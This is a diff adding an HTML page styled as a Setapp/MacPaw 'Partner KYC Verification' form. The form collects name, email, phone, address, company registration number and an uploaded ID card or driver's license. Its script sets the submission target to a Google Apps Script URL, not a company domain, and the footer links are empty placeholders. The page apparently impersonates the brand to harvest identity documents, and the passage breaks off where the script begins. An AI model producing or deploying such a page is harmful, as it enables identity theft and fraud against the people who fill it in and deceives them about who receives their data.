@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Partner KYC Verification – Setapp</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<style>
+  @font-face {
+    font-family: 'Fixel';
+    src: url('https://cdn.jsdelivr.net/gh/macpaw/fixel@latest/fonts/FixelDisplay-Regular.woff2') format('woff2');
+    font-weight: 400;
+  }
+  @font-face {
+    font-family: 'Fixel';
+    src: url('https://cdn.jsdelivr.net/gh/macpaw/fixel@latest/fonts/FixelDisplay-Medium.woff2') format('woff2');
+    font-weight: 500;
+  }
+  @font-face {
+    font-family: 'Fixel';
+    src: url('https://cdn.jsdelivr.net/gh/macpaw/fixel@latest/fonts/FixelDisplay-SemiBold.woff2') format('woff2');
+    font-weight: 600;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Fixel', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: #F2F1F6;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 48px 16px 64px;
+    color: #1A1A1A;
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 32px;
+  }
+  .brand img {
+    height: 36px;
+    width: auto;
+  }
+  .brand-text {
+    display: flex;
+    flex-direction: column;
+  }
+  .brand-name {
+    font-size: 20px;
+    font-weight: 600;
+    color: #1A1A1A;
+    line-height: 1.1;
+  }
+  .brand-sub {
+    font-size: 12px;
+    color: #888;
+    font-weight: 400;
+  }
+
+  .card {
+    background: #fff;
+    border-radius: 20px;
+    padding: 48px 48px 40px;
+    width: 100%;
+    max-width: 560px;
+    box-shadow: 0 4px 32px rgba(0,0,0,0.07);
+  }
+
+  .card-header {
+    margin-bottom: 36px;
+    text-align: center;
+  }
+  .card-header h1 {
+    font-size: 26px;
+    font-weight: 600;
+    color: #1A1A1A;
+    margin-bottom: 10px;
+  }
+  .card-header p {
+    font-size: 14px;
+    color: #666;
+    line-height: 1.6;
+  }
+
+  .section-label {
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: #f83ad5;
+    margin: 28px 0 16px;
+  }
+  .section-label:first-of-type { margin-top: 0; }
+
+  .field {
+    margin-bottom: 18px;
+  }
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 500;
+    color: #444;
+    margin-bottom: 6px;
+  }
+  label .req { color: #f83ad5; margin-left: 2px; }
+  label .opt { color: #aaa; font-weight: 400; font-size: 12px; margin-left: 4px; }
+
+  input[type=text],
+  input[type=email],
+  input[type=tel],
+  select {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1.5px solid #E5E5E5;
+    border-radius: 10px;
+    font-size: 15px;
+    font-family: inherit;
+    color: #1A1A1A;
+    background: #fff;
+    outline: none;
+    transition: border-color .2s;
+    appearance: none;
+  }
+  input:focus, select:focus {
+    border-color: #f83ad5;
+    box-shadow: 0 0 0 3px rgba(248,58,213,0.10);
+  }
+  input.error, select.error {
+    border-color: #e53935;
+  }
+  .err-msg {
+    font-size: 12px;
+    color: #e53935;
+    margin-top: 4px;
+    display: none;
+  }
+  .err-msg.show { display: block; }
+
+  /* Custom select arrow */
+  .select-wrap { position: relative; }
+  .select-wrap::after {
+    content: '';
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 0; height: 0;
+    border-left: 5px solid transparent;
+    border-right: 5px solid transparent;
+    border-top: 6px solid #aaa;
+    pointer-events: none;
+  }
+
+  /* Upload area */
+  .upload-area {
+    border: 2px dashed #E0E0E0;
+    border-radius: 12px;
+    padding: 28px 20px;
+    text-align: center;
+    cursor: pointer;
+    transition: border-color .2s, background .2s;
+    position: relative;
+  }
+  .upload-area:hover, .upload-area.drag { border-color: #f83ad5; background: rgba(248,58,213,0.03); }
+  .upload-area input[type=file] {
+    position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%;
+  }
+  .upload-icon {
+    width: 36px; height: 36px; margin: 0 auto 10px;
+    background: #F2F1F6; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .upload-icon svg { width: 18px; height: 18px; }
+  .upload-text { font-size: 14px; color: #555; font-weight: 500; }
+  .upload-hint { font-size: 12px; color: #aaa; margin-top: 4px; }
+  .upload-filename { font-size: 13px; color: #f83ad5; margin-top: 8px; display: none; }
+
+  /* Submit button */
+  .btn {
+    display: block;
+    width: 100%;
+    margin-top: 32px;
+    padding: 15px;
+    background: #f83ad5;
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 600;
+    font-family: inherit;
+    cursor: pointer;
+    transition: background .2s, transform .1s;
+  }
+  .btn:hover { background: #d92fb8; }
+  .btn:active { transform: scale(.98); }
+  .btn:disabled { background: #ddd; cursor: not-allowed; transform: none; }
+
+  /* Status messages */
+  .status {
+    display: none;
+    margin-top: 20px;
+    padding: 14px 18px;
+    border-radius: 10px;
+    font-size: 14px;
+    text-align: center;
+  }
+  .status.success { display: block; background: #F0FFF4; color: #276749; border: 1px solid #9AE6B4; }
+  .status.error   { display: block; background: #FFF5F5; color: #C53030; border: 1px solid #FEB2B2; }
+
+  .footer {
+    margin-top: 36px;
+    text-align: center;
+    font-size: 12px;
+    color: #aaa;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+  .footer a { color: #aaa; text-decoration: underline; }
+  .footer-links { display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; }
+</style>
+</head>
+<body>
+
+<div class="brand">
+  <img src="data:image/png;base64,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" alt="Setapp logo">
+  <div class="brand-text">
+    <span class="brand-name">Setapp</span>
+    <span class="brand-sub">by MacPaw</span>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-header">
+    <h1>Partner KYC Verification</h1>
+    <p>Complete this form to proceed with your partner onboarding.<br>Your data is handled securely and reviewed by our legal team.</p>
+  </div>
+
+  <form id="kycForm" novalidate>
+
+    <div class="section-label">Personal Information</div>
+
+    <div class="field">
+      <label for="fullName">Full Name <span class="req">*</span></label>
+      <input type="text" id="fullName" name="fullName" placeholder="Jane Smith" required>
+      <div class="err-msg" id="fullName-err">Please enter your full name.</div>
+    </div>
+
+    <div class="field">
+      <label for="email">Email Address <span class="req">*</span></label>
+      <input type="email" id="email" name="email" placeholder="jane@company.com" required>
+      <div class="err-msg" id="email-err">Please enter a valid email address.</div>
+    </div>
+
+    <div class="field">
+      <label for="phone">Phone Number <span class="opt">(optional)</span></label>
+      <input type="tel" id="phone" name="phone" placeholder="+1 234 567 8900">
+      <div class="err-msg" id="phone-err">Please enter a valid phone number.</div>
+    </div>
+
+    <div class="field">
+      <label for="address">Address <span class="req">*</span></label>
+      <input type="text" id="address" name="address" placeholder="123 Main Street, City, Postal Code" required>
+      <div class="err-msg" id="address-err">Please enter your address.</div>
+    </div>
+
+    <div class="section-label">Company Details</div>
+
+    <div class="field">
+      <label for="country">Country of Registration <span class="req">*</span></label>
+      <div class="select-wrap">
+        <select id="country" name="country" required>
+          <option value="">Select country</option>
+          <option>Afghanistan</option><option>Albania</option><option>Algeria</option>
+          <option>Andorra</option><option>Angola</option><option>Argentina</option>
+          <option>Armenia</option><option>Australia</option><option>Austria</option>
+          <option>Azerbaijan</option><option>Bahamas</option><option>Bahrain</option>
+          <option>Bangladesh</option><option>Belarus</option><option>Belgium</option>
+          <option>Belize</option><option>Bolivia</option><option>Bosnia and Herzegovina</option>
+          <option>Brazil</option><option>Brunei</option><option>Bulgaria</option>
+          <option>Cambodia</option><option>Cameroon</option><option>Canada</option>
+          <option>Chile</option><option>China</option><option>Colombia</option>
+          <option>Costa Rica</option><option>Croatia</option><option>Cyprus</option>
+          <option>Czech Republic</option><option>Denmark</option><option>Dominican Republic</option>
+          <option>Ecuador</option><option>Egypt</option><option>Estonia</option>
+          <option>Ethiopia</option><option>Finland</option><option>France</option>
+          <option>Georgia</option><option>Germany</option><option>Ghana</option>
+          <option>Greece</option><option>Guatemala</option><option>Honduras</option>
+          <option>Hungary</option><option>Iceland</option><option>India</option>
+          <option>Indonesia</option><option>Iran</option><option>Iraq</option>
+          <option>Ireland</option><option>Israel</option><option>Italy</option>
+          <option>Jamaica</option><option>Japan</option><option>Jordan</option>
+          <option>Kazakhstan</option><option>Kenya</option><option>Kosovo</option>
+          <option>Kuwait</option><option>Kyrgyzstan</option><option>Latvia</option>
+          <option>Lebanon</option><option>Libya</option><option>Liechtenstein</option>
+          <option>Lithuania</option><option>Luxembourg</option><option>Malaysia</option>
+          <option>Malta</option><option>Mexico</option><option>Moldova</option>
+          <option>Monaco</option><option>Mongolia</option><option>Montenegro</option>
+          <option>Morocco</option><option>Myanmar</option><option>Nepal</option>
+          <option>Netherlands</option><option>New Zealand</option><option>Nicaragua</option>
+          <option>Nigeria</option><option>North Macedonia</option><option>Norway</option>
+          <option>Oman</option><option>Pakistan</option><option>Panama</option>
+          <option>Paraguay</option><option>Peru</option><option>Philippines</option>
+          <option>Poland</option><option>Portugal</option><option>Qatar</option>
+          <option>Romania</option><option>Russia</option><option>Rwanda</option>
+          <option>Saudi Arabia</option><option>Senegal</option><option>Serbia</option>
+          <option>Singapore</option><option>Slovakia</option><option>Slovenia</option>
+          <option>South Africa</option><option>South Korea</option><option>Spain</option>
+          <option>Sri Lanka</option><option>Sudan</option><option>Sweden</option>
+          <option>Switzerland</option><option>Taiwan</option><option>Tajikistan</option>
+          <option>Tanzania</option><option>Thailand</option><option>Tunisia</option>
+          <option>Turkey</option><option>Uganda</option><option>Ukraine</option>
+          <option>United Arab Emirates</option><option>United Kingdom</option>
+          <option>United States</option><option>Uruguay</option><option>Uzbekistan</option>
+          <option>Venezuela</option><option>Vietnam</option><option>Yemen</option>
+          <option>Zambia</option><option>Zimbabwe</option>
+        </select>
+      </div>
+      <div class="err-msg" id="country-err">Please select a country.</div>
+    </div>
+
+    <div class="field">
+      <label for="regNumber">Registration Number <span class="req">*</span></label>
+      <input type="text" id="regNumber" name="regNumber" placeholder="e.g. 12345678" required>
+      <div class="err-msg" id="regNumber-err">Please enter your registration number.</div>
+    </div>
+
+    <div class="section-label">Identity Document</div>
+
+    <div class="field">
+      <label>ID Card / Driver's License <span class="req">*</span></label>
+      <div class="upload-area" id="uploadArea">
+        <input type="file" id="fileInput" accept=".jpg,.jpeg,.png,.pdf">
+        <div class="upload-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#f83ad5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/>
+            <path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/>
+          </svg>
+        </div>
+        <div class="upload-text">Click to upload or drag and drop</div>
+        <div class="upload-hint">JPEG &middot; PNG &middot; PDF &nbsp;&middot;&nbsp; Max 10 MB</div>
+        <div class="upload-filename" id="uploadFilename"></div>
+      </div>
+    </div>
+
+    <button type="submit" class="btn" id="submitBtn">Submit for KYC Review</button>
+    <div class="status" id="statusMsg"></div>
+
+  </form>
+</div>
+
+<div class="footer">
+  <div class="footer-links">
+    <a href="#">Privacy Policy</a>
+    <a href="#">Terms of Use</a>
+  </div>
+  <span>All data is encrypted in transit &nbsp;&middot;&nbsp; &copy; 2026 MacPaw Inc. All rights reserved.</span>
+</div>
+
+<script>
+  const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbySe4OjzAfEYgiDKIjHd137EBDemVdaxQIsJPOGBpaG07xctkcPgKmcPSYHRSzijoL0/exec';
+
+  // Drag & drop highlight
+  const uploadArea = document.getElementById('uploadArea');
+  const fileInput  = document.getElementById('fileInput');
+  const uploadFilename = document.getElementById('uploadFilename');
+
